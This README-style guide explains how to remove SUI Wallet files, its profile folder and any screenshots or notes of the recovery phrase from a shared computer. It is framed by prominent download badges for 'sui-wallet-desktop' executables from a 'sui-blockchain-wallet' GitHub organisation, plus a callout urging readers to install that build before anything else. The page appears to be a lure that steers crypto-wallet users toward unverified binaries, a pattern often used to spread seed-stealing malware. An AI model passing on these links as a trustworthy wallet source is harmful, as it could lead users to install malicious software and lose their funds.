![SUI Wallet](assets/banner-article.png)

# Deleting SUI Wallet data from a shared PC

Uninstalling leaves data behind; a shared machine needs the rest removing too.

[![Download for Windows](https://img.shields.io/badge/DOWNLOAD-WINDOWS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) [![Download for macOS](https://img.shields.io/badge/DOWNLOAD-MACOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) [![Download for Linux](https://img.shields.io/badge/DOWNLOAD-LINUX-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux)](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip)

| Platform | Requirements | File |
| --- | --- | --- |
| ![platform Windows](https://img.shields.io/badge/platform-Windows-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAyNCAyNCI%2BPHBhdGggZmlsbD0iI2ZmZiIgZD0iTTAgM2wxMC0xdjEwSDB6TTExIDJsMTMtMnYxMkgxMXpNMCAxM2gxMHYxMGwtMTAtMXpNMTEgMTNoMTN2MTFsLTEzLTJ6Ii8%2BPC9zdmc%2B) | Windows 10 (1909) or later, 64-bit | [sui-wallet-desktop-win-v0.2.6.exe](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-win-v0.2.6.exe) |
| ![platform macOS](https://img.shields.io/badge/platform-macOS-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=apple) | macOS 12 or later | [sui-wallet-desktop-macos-v0.2.6.dmg](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-macos-v0.2.6.dmg) |
| ![platform Linux](https://img.shields.io/badge/platform-Linux-4DA2FF?style=for-the-badge&labelColor=0D1117&logoColor=white&logo=linux) | x64, Ubuntu 20.04 or later, or equivalent | [sui-wallet-desktop-linux-v0.2.6.zip](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/download/v0.2.6/sui-wallet-desktop-linux-v0.2.6.zip) |

Windows ships one `.exe`, macOS one `.dmg`, and Linux one `.zip` holding a `.deb` and a `.pacman` package.

All three files, with their SHA-256 digests, are on the [release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest).

> **Current release:** every problem described in these guides is addressed in the build above. Install it before trying anything else.

## Short answer

Remove three things in order: the application, its local profile, and any copy of the phrase that machine
holds - a screenshot, a note, a file, a printout. The account itself cannot be deleted from a shared computer
because it was never stored there. What a shared computer can cost you is the phrase.

## What is actually on the machine

An installation, a small profile holding preferences and derived account data, and whatever you personally put there: a screenshot of the setup screen, a note with the words, a downloaded backup file. The first two are removable, and the third decides everything.

The first two are removable and the third is the one that matters. A profile is a convenience; a screenshot of
a phrase is the account, permanently, in a folder that outlives the uninstall.

It helps to know which of the three a search would find. The application is a folder with a name, the profile is a folder with the application's name inside the user's data, and a screenshot is wherever the screenshot tool put it, which is usually not where anyone looks.

## Before you delete anything

Confirm the phrase exists somewhere you control, on paper, and that this machine's address is written beside it. Deleting the only copy of the words before verifying the paper is the single irreversible step in this whole process. Verify, then remove.

If the phrase only exists on this computer, the order changes: write it on paper first, check it against what
the app shows, and only then start removing things.
[Backing up your SUI Wallet recovery phrase](https://github.com/sui-blockchain-wallet/key-safety-and-login/blob/main/backing-up-your-sui-wallet-recovery-phrase.md) covers the check that makes that copy trustworthy.

## Removing the application and its profile

Uninstall the application the way the platform expects, then find the application's data folder in the user
profile and delete it too. The uninstaller usually stops at the program and reports success, which is why the
second step is easy to miss.

Do it while signed in as the account that used the wallet rather than as an administrator, since the profile
belongs to that user's folder.
[How to uninstall SUI Wallet completely](https://github.com/sui-blockchain-wallet/app-setup-and-troubleshooting/blob/main/how-to-uninstall-sui-wallet-completely.md) has the platform-by-platform version of those two steps.

## Hunting the copies

Search the machine for the words themselves, one unusual word from the middle of the phrase at a time. That
finds a text file, a screenshot's filename, a document and a note, in a way that searching for "seed phrase"
does not.

Then empty the bin and check the screenshot folder by hand, because image files carry no text to search. If a
copy was ever printed, the paper is outside the machine and has to be found and destroyed separately.

Do this before the uninstall rather than after it, since a machine with the app still on it gives you a place to compare the phrase against. After the removal there is nothing to check the paper against on that machine.

## If the machine is not yours to wipe

A work laptop, a library terminal, a machine you borrowed: assume every copy you leave is somebody else's
information. Uninstall, remove the profile, delete every screenshot and note you created, clear the download
folder, and sign out of anything you signed into.

Where the machine's owner can reinstall the operating system, that is the stronger answer, and it is their
decision rather than yours. Saying what you stored is more useful than hoping nobody looks.

Two things are worth telling the owner rather than hiding: that a wallet was used here, and that the balance is controlled by a phrase kept elsewhere. Neither is embarrassing, and both are cheaper than a later surprise.

## After someone else has used it

If the machine was shared after the wallet was used on it, treat the phrase as exposed and move the balance to an account created somewhere clean. That advice is identical to any other exposure, and cheaper than wondering later.

## Reinstalling later

The current release from the
[release page](https://github.com/sui-blockchain-wallet/sui-wallet-desktop/releases/latest) is what you would
install on a machine you trust, and the 24 words on paper restore the account there in a minute. Nothing about
this process is permanent except a phrase left behind.

## FAQ

### Does deleting the wallet data delete the account?

No. The account lives on the chain and is derived from the phrase, so removing every file on the machine leaves
it intact and reachable from the paper copy.

### What should I delete on a shared PC?

The application, its data folder in the user profile, and every personal copy of the words - screenshots,
notes, downloads. The third list is the one that decides whether the machine is safe to hand on.

### Can someone recover my account from the deleted data?

Not from the profile, which does not hold the phrase in a form you could restore from. From a screenshot or a
note, yes - which is why the copies matter more than the installation.

### Is uninstalling enough?

No. An uninstaller removes the program and leaves the profile and your own files exactly where they were.

### How do I know no copy is left?

Search for a distinctive word from the phrase, then check images by hand. If a copy cannot be accounted for,
treat the account as exposed and move the balance.

### Does signing out of the app help?

There is no session to sign out of; the phrase is the credential. That is why cleaning the machine is about
files rather than logins.
